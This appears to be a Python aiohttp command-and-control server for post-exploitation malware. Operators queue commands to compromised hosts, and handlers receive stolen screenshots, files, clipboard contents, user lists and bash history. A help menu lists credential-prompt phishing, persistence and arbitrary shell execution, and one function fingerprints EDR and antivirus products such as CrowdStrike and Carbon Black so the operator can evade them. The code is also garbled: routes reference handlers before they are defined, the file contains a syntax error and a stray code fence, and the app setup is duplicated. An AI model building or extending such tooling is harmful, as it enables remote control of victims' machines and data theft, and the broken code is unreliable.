from aiohttp import web
from datetime import datetime
import sys
import subprocess  # Import subprocess for shell commands

# Define aiohttp web application
app = web.Application()

# Define routes and corresponding handler functions

# Endpoint for initial check-in from the client
app.add_routes([web.get('/initialize/sequence/0', InitCall)])

# Endpoint for client to request C2 instructions
app.add_routes([web.get('/validate/status', CheckIn)])

# Endpoints for client to send data after receiving instructions
app.add_routes([
    web.post('/validate/status/1', GetScreenshot),  # Client sends screenshots here
    web.post('/validate/status/2', GetDownload),    # Client sends downloaded files here
    web.post('/validate/status/3', GetPath),        # Client sends path information here
    web.post('/validate/status/4', ChangeDir),      # Client sends change directory information here
    # Add more endpoints for other post-exploitation tasks as needed
])

# Set up an empty dictionary to hold C2 post exploitation commands for target hosts
cmds = {}

# Function to handle initialization call from client
async def InitCall(request):
    # Simply returns an OK response to the client without performing any other tasks
    text = 'OK'
    return web.Response(text=text)

# Function to handle check-in from client and process C2 commands
async def CheckIn(request):
    # Clear the cmds dictionary to ensure fresh commands for each check-in
    cmds.clear()

    # Get peername (host and port) from the request
    peername = request.transport.get_extra_info('peername')
    host, port = peername

    # Initialize counters for commands and additional variables
    # Clear out the cmds dictionary. The operator inputs the commands 
    #intended to be executed on the target client. These commands are then 
    #received by the client in response to its GET request made to this endpoint.
    cmd_counter = 0
    count2 = 0

    # Initialize response text
    text = "OK"

    # Loop to continuously receive commands from operator
    while True:
        # Receive command input from the operator
        command = input("\033[34m[Source: %s]>>>\033[0m " % str(peername))

        # Check if operator requests help
        if 'help' in command:
            # Print help menu for available commands
            print("-" * 100)
            print("\033[33mHelp menu: \033[0m")
            print(">ALIASES<---")
            print("\033[33msysteminfo\033[0m: Return useful system information")
            print(">\033[33mcd [directory]\033[0m: cd to the directory specified (ex: cd C:\\Users)")
            print(">\033[33mlistdir\033[0m: list files and directories")
            print(">\033[33mdownload [filename]\033[0m: after you cd to directory of interest, download files of interest (one at a time)")
            print("\033[33mlistusers\033[0m: List users")
            print("\033[33maddresses\033[0m: List internal address(es) for this host")
            print("\033[33mlcwd: Show current server working directory")
            print(">\033[33mpwd: Show working directory on host")
            print('')
            print("--->COMMANDS <---")
            print(">\033[33mprompt\033[0m: Propmpt the user to enter credentials")
            print("\033[33muserhist\033[0m: Grep for interesting hosts from bash history")
            print("\033[33mclipboard\033[0m: Grab text in the user's clipboard")
            print("\033[33mconnections\033[0m: Show active network connections")
            print("\033[33mchecksecurity\033[0m: Search for common EDR products")
            print(">\033[33mscreenshot\033[0m: Capture a screenshot")
            print("\033[33mpersist\033[0m: Add persistence to the system")
            print("\033[33munpersist\033[0m: Remove persistence")
            print("\033[33mshell [shell command]\033[0m: Run a shell command (not OPSEC safe)")
            print('')
            print(">OTHER<---")
            print(">\033[33mIn general enter whatever shell command you want to run.")
            print(">\033[33mexit\033[0m: Exit the session and stop the client")
            print("-" * 100)

      # Replace macOS-specific commands: Commands like screenshot, pwd, and cd
      # File paths are formatted differently (\ instead of /) and certain commands may have different options or outputs.
      # Some macOS-specific commands have been removed or replaced with more generic commands.
      

        elif 'exit' in command:
            cmd_counter = cmd_counter + 1
            cmds["%s'" % str(cmd_counter)] = command
            print("\033[33m%s queued for execution on the endpoint at next checkin\033[0m" % command)

        elif 'lcwd' in command:
            # Get current working directory using subprocess
            x = subprocess.getstatusoutput("cd")
            print("Current server working directory: ")
            print(str(x).replace("(0, '', '').replace("')", ''))

        elif (('pwd' in command) and ('shell' not in command)):
            cmd_counter = cmd_counter + 1
            cmds["'%s'" % str(cmd_counter)] = command
            print("\033[33m%s queued for execution on the endpoint at next checkin\033[0m" % command)

        elif (('cat' in command) and ('shell' not in command)):
            cmd_counter = cmd_counter + 1
            cmds["'%s'" % str(cmd_counter)] = command
            print("\033[33m%s queued for execution on the endpoint at next checkin\033[0m" % command)

        elif 'listdir' in command:
            cmd_counter = cmd_counter + 1
            cmds["%s" % str(cmd_counter)] = command
            print("\033[33m%s queued for execution on the endpoint at next checkin\033[0m" % command)

        elif 'whoami' in command:
            cmd_counter = cmd_counter + 1
            cmds["%s" % str(cmd_counter)] = command
            print("\033[33m%s queued for execution on the endpoint at next checkin\033[0m" % command)

        # Add Windows-specific commands and their handling here.
        # Done command exits the operator out of this loop...
        # ...converts them to a list, and returns them in list form in the web response body back to the client. 

        elif command == 'done':
            # When the operator is done entering commands, return them as JSON response
            data_list = list(cmds.values())
            return web.json_response(data_list)
            break

        else:
            print("[-] Command not found")
            return web.Response(text=text)


async def GetScreenshot(request):
    # Read the screenshot data sent by the target client
    sdata = await request.read()
    
    # Record the current timestamp
    timestmp = datetime.now()
    print("Timestamp: %s" % str(timestmp))
    
    # Generate timestamp for the filename
    tstamp = datetime.now()
    
    # Save the screenshot with the timestamp as the filename in the current directory
    with open("screenshot_%s.jpg" % str(tstamp), 'wb') as sshot:
        sshot.write(sdata)
    
    # Confirm the successful saving of the screenshot
    print("[+] Screenshot saved to current directory")
    
    # Send "OK" response to the client
    text = "OK"
    return web.Response(text=text)

async def GetDownload(request):
    # Read the file data sent by the target client
    ddata = await request.read()
    
    # Record the current timestamp
    timestmp = datetime.now()
    print("Timestamp: %s" % str(timestmp))
    
    # Save the file with the timestamp as the filename in the current directory
    with open("download_%s" % str(timestmp), 'wb') as file:
        file.write(ddata)
    
    # Confirm the successful completion of the file download
    print("[+] File download complete")
    
    # Send "OK" response to the client
    text = 'OK'
    return web.Response(text=text)

async def GetPath(request):
    # Read the path data sent by the target client
    path = await request.read()
    
    # Record the current timestamp
    timestmp = datetime.now()
    print("Timestamp: %s" % str(timestmp))
    
    # Print the current directory path received from the client
    print("[+] Current directory path: %s" % str(path))
    
    # Send "OK" response to the client
    text = 'OK'
    return web.Response(text=text)

async def ChangeDir(request):
    # Read the path information sent by the target client
    pathinfo = await request.read()
    
    # Record the current timestamp
    timestmp = datetime.now()
    print("Timestamp: %s" % str(timestmp))
    
    # Print the directory change information received from the client
    print("[+] %s" % str(pathinfo))
    
    # Send "OK" response to the client
    text = 'OK'
    return web.Response(text=text)

async def ListDir(request):
    # Read the list information sent by the target client
    listinfo = await request.read()
    
    # Record the current timestamp
    timestmp = datetime.now()
    print("Timestamp: %s" % str(timestmp))
    
    # Print the directory listing received from the client
    print("[+]Results:\n%s" % str(listinfo))
    
    # Send "OK" response to the client
    text = 'OK'
    return web.Response(text=text)

#########

async def Clipboard(request):
    # Read the clipboard data sent by the target client
    clipinfo = await request.read()
    
    # Record the current timestamp
    timestmp = datetime.now()
    print("Timestamp: %s" % str(timestmp))
    
    # Save the clipboard data in a file with timestamp as the filename in the current directory
    with open("clipdata_%s.txt" % str(timestmp), 'wb') as clip:
        clip.write(clipinfo)
    
    # Confirm the successful download of clipboard content
    print("[+] Clipboard content downloaded in current directory.")
    
    # Send "OK" response to the client
    text = 'OK'
    return web.Response(text=text)

async def Prompt(request):
    # Read the prompt data sent by the target client
    promptdata = await request.read()
    
    # Record the current timestamp
    timestmp = datetime.now()
    print("Timestamp: %s" % str(timestmp))
    
    # Print the prompt data received from the client
    print("[+] %s" % str(promptdata))
    
    # Send "OK" response to the client
    text = 'OK'
    return web.Response(text=text)

async def ConnData(request):
    # Read the connection data sent by the target client
    conndata = await request.read()
    
    # Record the current timestamp
    timestmp = datetime.now()
    print("Timestamp: %s" % str(timestmp))
    
    # Print the connection data received from the client
    print("[+] %s" % str(conndata))
    
    # Send "OK" response to the client
    text = 'OK'
    return web.Response(text=text)

async def Addresses(request):
    # Read the address data sent by the target client
    addressdata = await request.read()
    
    # Record the current timestamp
    timestmp = datetime.now()
    print("Timestamp: %s" % str(timestmp))
    
    # Print the address data received from the client
    print("[+] %s" % str(addressdata))
    
    # Send "OK" response to the client
    text = 'OK'
    return web.Response(text=text)

async def ListUsers(request):
    # Read the user data sent by the target client
    userdata = await request.read()
    
    # Record the current timestamp
    timestmp = datetime.now()
    print("Timestamp: %s" % str(timestmp))
    
    # Print the local user accounts data received from the client
    print("[+] Local User Accounts Found:\n%s" % str(userdata))
    
    # Send "OK" response to the client
    text = 'OK'
    return web.Response(text=text)

async def UserHist(request):
    # Read the user history data sent by the target client
    histdata = await request.read()
    
    # Record the current timestamp
    timestmp = datetime.now()
    print("Timestamp: %s" % str(timestmp))
    
    # Print the bash history data received from the client
    print("[+] Bash History Data:\r%s" % str(histdata))
    
    # Send "OK" response to the client
    text = 'OK'
    return web.Response(text=text)


#########
# More MacOS to Windows changes need to be made for the following function:


async def CheckSecurity(request):
    # Read the security data sent by the target client
    secdata = await request.read()
    
    # Record the current timestamp
    timestmp = datetime.now()
    print("Timestamp: %s" % str(timestmp))
    
    # Initialize a flag variable to indicate if any security products are found
    b = 0
    
    # Check for Carbon Black 0SX Sensor (MacOS)
    if 'CbOsxSensorService' in str(secdata):
        print('[+] \033[33mCarbon Black 0SX Sensor installed\033[0m')
        b = 1
    
    # Check for Carbon Black Defense A/V (MacOS)
    if 'CbDefense' in str(secdata):
        print('[+] \033[33mCarbon Black Defense A/V installed\033[0m')
        b = 1
    
    # Check for ESET A/V (MacOS)
    if ('ESET' in str(secdata) or '/eset' in str(secdata)):
        print('[+] \033[33mESET A/V installed\033[0m')
        b = 1
    
    # Check for Little Snitch firewall (MacOS)
    if ('Littlesnitch' in str(secdata) or 'Snitch' in str(secdata)):
        print('[+] \033[33mLittle Snitch firewall running\033[0m')
        b = 1
    
    # Check for FireEye HX agent (MacOS)
    if 'xagt' in str(secdata):
        print('[+] \033[33mFireEye HX agent installed\033[0m')
        b = 1
    
    # Check for Crowdstrike Falcon agent (MacOS)
    if 'falconctl' in str(secdata):
        print('[+] \033[33mCrowdstrike Falcon agent installed\033[0m')
        b = 1
    
    # Check for Global Protect PAN VPN client (MacOS)
    if ('GlobalProtect' in str(secdata) or '/PanGPS' in str(secdata)):
        print('[+] \033[33mGlobal Protect PAN VPN client running\033[0m')
        b = 1
    
    # Check for OpenDNS Client (MacOS)
    if 'OpenDNS' in str(secdata):
        print('[+] \033[33mOpenDNS Client running\033[0m')
        b = 1
    
    # Check for Pulse VPN client (MacOS)
    if 'HostChecker' in str(secdata):
        print('[+] \033[33mPulse VPN client running\033[0m')
        b = 1
    
    # If no security products found, print message
    if b == 0:
        print('[-] No security products found.')
    
    # Send "OK" response to the client
    text = 'OK'
    return web.Response(text=text)


#########

```python
async def Whoami(request):
    # Read data sent by the target client
    wdata = await request.read()
    
    # Record the current timestamp
    timestmp = datetime.now()
    print("Timestamp: %s" % str(timestmp))
    
    # Print current user identity
    print("[+] Current user identity: %s" % str(wdata.decode('utf8')))
    
    # Send "OK" response to the client
    text = 'OK'
    return web.Response(text=text)


async def SysInfo(request):
    # Read data sent by the target client
    sysinfodata = await request.read()
    
    # Record the current timestamp
    timestmp = datetime.now()
    print("Timestamp: %s" % str(timestmp))
    
    # Print basic system information
    print("[+] Basic system info:\n%s" % str(sysinfodata))
    
    # Send "OK" response to the client
    text = 'OK'
    return web.Response(text=text)


async def CatFile(request):
    # Read data sent by the target client
    catdata = await request.read()
    
    # Record the current timestamp
    timestmp = datetime.now()
    print("Timestamp: %s" % str(timestmp))
    
    # Print file content
    print("[+] File Content:\n%s" % str(catdata))
    
    # Send "OK" response to the client
    text = 'OK'
    return web.Response(text=text)


async def ShellCmd(request):
    # Read data sent by the target client
    cmddata = await request.read()
    
    # Record the current timestamp
    timestmp = datetime.now()
    print("Timestamp: %s" % str(timestmp))
    
    # Print shell command results
    print("[+] Shell Command Results:\n%s" % str(cmddata))
    
    # Send "OK" response to the client
    text = 'OK'
    return web.Response(text=text)


async def Sleeper(request):
    # Read data sent by the target client
    sleepdata = await request.read()
    
    # Record the current timestamp
    timestmp = datetime.now()
    print("Timestamp: %s" % str(timestmp))
    
    # Print received data
    print("[+] %s" % str(sleepdata))
    
    # Send "OK" response to the client
    text = 'OK'
    return web.Response(text=text)


async def Persist(request):
    # Read data sent by the target client
    returndata = await request.read()
    
    # Record the current timestamp
    timestmp = datetime.now()
    print("Timestamp: %s" % str(timestmp))
    
    # Print received data
    print("[+] %s" % str(returndata))
    
    # Send "OK" response to the client
    text = 'OK'
    return web.Response(text=text)
``` 

#########

# Define aiohttp web application
app = web.Application()

# Define routes and corresponding handler functions

# Endpoint for initial check-in from the client
app.add_routes([web.get('/initialize/sequence/0', InitCall)])

# Endpoint for client to request C2 instructions
app.add_routes([web.get('/validate/status', CheckIn)])

# Endpoints for client to send data after receiving instructions
app.add_routes([
    web.post('/validate/status/1', GetScreenshot),  # Client sends screenshots here
    web.post('/validate/status/2', GetDownload),    # Client sends downloaded files here
    web.post('/validate/status/3', GetPath),        # Client sends path information here
    web.post('/validate/status/4', ChangeDir),      # Client sends change directory information here
    # Add more endpoints for other post-exploitation tasks as needed
])



